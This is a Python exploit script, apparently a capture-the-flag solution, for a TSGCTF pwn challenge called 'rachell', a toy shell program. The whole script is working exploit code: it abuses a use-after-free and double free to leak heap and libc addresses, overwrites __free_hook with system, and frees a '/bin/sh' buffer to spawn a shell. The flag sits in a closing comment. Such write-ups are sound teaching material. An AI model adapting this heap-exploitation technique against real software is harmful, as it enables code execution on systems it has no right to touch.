from ptrlib import *


def run(cmd, arg1, arg2=None, arg3=None):
    # user, host = sock.recvregex("(.+)@(.+):/\\$")
    sock.sendlineafter(b"command> ", cmd)
    if arg1:
        sock.sendlineafter(b"> ", arg1)
    if arg2:
        sock.sendlineafter(b"> ", arg2)
    if arg3:
        sock.sendlineafter(b"> ", arg3)
    # return user, host


libc = ELF("libc.so.6")
elf = ELF("rachell")
host = "localhost"
port = 25252
sock = Socket(host, port)

run("touch", "CCCC")
run("echo", "C" * 0x428, "y", "CCCC")
run("touch", "XXXX")
run("touch", "YYYY")
run("touch", "ZZZZ")
run("touch", "AAAA")
run("echo", "A" * 0xa8, "y", "AAAA")
run("touch", "BBBB")
run("echo", "B" * 0x28, "y", "BBBB")
run("cd", "home")
run("rm", "../AAAA")
run("rm", "../AAAA")  # maybe used later (UAF on 0000 node)
run("rm", "../BBBB")
run("mkdir", "0000")  # 0000->name = BBBB->buf
run("cd", "0000")
run("rm", "../../BBBB")
run("rm", "../../BBBB")  # write heap address to BBBB->buf
heap_base = u64(sock.recvregex(b"/home/(.+)\\$")[0]) - 0xe80
logger.info("heap --> %s" % hex(heap_base))
run("rm", "../../CCCC")
payload = b''
payload += p64(1)  # file
payload += p64(heap_base + 0x2a0)  # parent is home (i don't have proc_base)
payload += p64(0) * 0x10  # no child
payload += p64(heap_base + 0x540)  # name (= CCCC->buf = linked to unsortedbin)
payload += p64(0)  # buf
payload += p64(0)  # size
run("echo", payload, "y", "../../AAAA")
libc_base = u64(sock.recvregex(b"/home/(.+)\\$")[0]) - libc.main_arena() - 0x60
logger.info("libc --> %s" % hex(libc_base))
run("rm", "../../AAAA")
payload = p64(libc_base + libc.symbol('__free_hook'))
payload += p64(heap_base + 0x2a0)  # parent is home
payload += p64(0) * 0x10  # no child
payload += p64(heap_base + 0x540)  # name
payload += p64(0)  # buf
payload += p64(0)  # size
run("echo", payload, "y", "../../AAAA")
run("echo", payload, "y", "../../XXXX")
payload = p64(libc_base + libc.symbol('system'))  # + 0xa0)
payload += b'\x00' * 0xa0
run("echo", payload, "y", "../../YYYY")
run("echo", "/bin/sh\0", "y", "../../ZZZZ")
run("rm", "../../ZZZZ")
sock.interactive()

# FLAG -->  TSGCTF{beer_is_delicious_if_you_dont_taste_it_6592867821310}
